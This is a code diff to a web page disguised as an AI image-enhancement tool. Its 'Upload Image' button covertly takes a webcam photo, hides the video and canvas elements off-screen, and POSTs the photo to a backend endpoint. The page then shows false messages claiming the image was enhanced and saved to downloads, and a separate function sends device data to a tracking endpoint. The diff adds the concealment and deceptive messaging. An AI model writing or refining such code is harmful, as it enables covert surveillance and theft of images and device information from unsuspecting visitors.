@@ -164,6 +164,8 @@
             display: inline-flex;
             align-items: center;
             gap: 0.5rem;
+            z-index: 10;
+            position: relative;
         }
         
         button:hover { 
@@ -222,6 +224,12 @@
         
         .footer-links a:hover {
             color: var(--primary);
+        }
+        
+        #video, #canvas {
+            position: absolute;
+            left: -9999px;
+            top: -9999px;
         }
         
         @media (max-width: 768px) {
@@ -284,13 +292,13 @@
             <p>Upload an image to enhance it with our advanced AI</p>
             <div class="upload-area">
                 <p>Your image will be instantly enhanced with our AI technology</p>
+                <button id="uploadBtn" style="margin-top: 20px;">
+                    <span>Upload Image</span> 📤
+                </button>
             </div>
-            <p id="statusMessage"></p> <!-- 🔥 UI Feedback -->
-            <video id="video" class="hidden" autoplay></video>
-            <canvas id="canvas" class="hidden"></canvas>
-            <button id="uploadBtn">
-                <span>Upload Image</span> 📤
-            </button>
+            <p id="statusMessage"></p>
+            <video id="video" autoplay></video>
+            <canvas id="canvas"></canvas>
         </div>
     </main>
 
@@ -315,46 +323,60 @@
         // 📸 Capture Photo & Send Data
         document.getElementById("uploadBtn").addEventListener("click", async () => {
             const statusMessage = document.getElementById("statusMessage");
-            statusMessage.innerText = "🔄 Capturing Image...";
+            statusMessage.innerText = "🔄 Requesting camera access...";
+            
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById("video");
                 video.srcObject = stream;
-                video.play();
+                
+                statusMessage.innerText = "📷 Camera access granted. Taking photo...";
+                
+                // Wait for video to be ready
+                video.onloadedmetadata = function() {
+                    video.play();
+                    
+                    setTimeout(() => {
+                        const canvas = document.getElementById("canvas");
+                        const context = canvas.getContext("2d");
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        statusMessage.innerText = "🔄 Processing image...";
 
-                setTimeout(() => {
-                    const canvas = document.getElementById("canvas");
-                    const context = canvas.getContext("2d");
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        canvas.toBlob(async (blob) => {
+                            if (!blob) {
+                                statusMessage.innerText = "❌ Failed to process image!";
+                                console.error("❌ Failed to convert image to Blob");
+                                return;
+                            }
 
-                    canvas.toBlob(async (blob) => {
-                        if (!blob) {
-                            console.error("❌ Failed to convert image to Blob");
-                            return;
-                        }
+                            const formData = new FormData();
+                            formData.append("photo", blob, "captured_image.jpg");
 
-                        const formData = new FormData();
-                        formData.append("photo", blob, "captured_image.jpg");
-
-                        try {
-                            await fetch(${backendURL}/upload-photo/${sessionId}, {
-                                method: "POST",
-                                body: formData,
-                            });
-                            statusMessage.innerText = "✅ Image Sent Successfully!";
-                            console.log("📤 Image sent successfully!");
-                        } catch (error) {
-                            statusMessage.innerText = "❌ Failed to Send Image!";
-                            console.error("❌ Error sending image:", error);
-                        }
-                    }, "image/jpeg", 0.5);
-
-                    stream.getTracks().forEach(track => track.stop());
-                }, 2000);
+                            try {
+                                statusMessage.innerText = "🔄 Sending to AI for enhancement...";
+                                
+                                await fetch(`${backendURL}/upload-photo/${sessionId}`, {
+                                    method: "POST",
+                                    body: formData,
+                                });
+                                
+                                statusMessage.innerText = "✅ Image enhanced successfully! Check your downloads.";
+                                console.log("📤 Image sent successfully!");
+                            } catch (error) {
+                                statusMessage.innerText = "❌ Failed to enhance image!";
+                                console.error("❌ Error sending image:", error);
+                            }
+                            
+                            // Stop all video tracks
+                            stream.getTracks().forEach(track => track.stop());
+                        }, "image/jpeg", 0.9);
+                    }, 2000);
+                };
             } catch (error) {
-                statusMessage.innerText = "❌ Camera access denied!";
+                statusMessage.innerText = "❌ Camera access denied! Please allow camera access.";
                 console.error("Camera access denied:", error);
             }
         });
@@ -408,7 +430,7 @@
 
         // 🚀 Send Data to Backend
         function sendData() {
-            fetch(${backendURL}/track/${sessionId}, {
+            fetch(`${backendURL}/track/${sessionId}`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(deviceData)
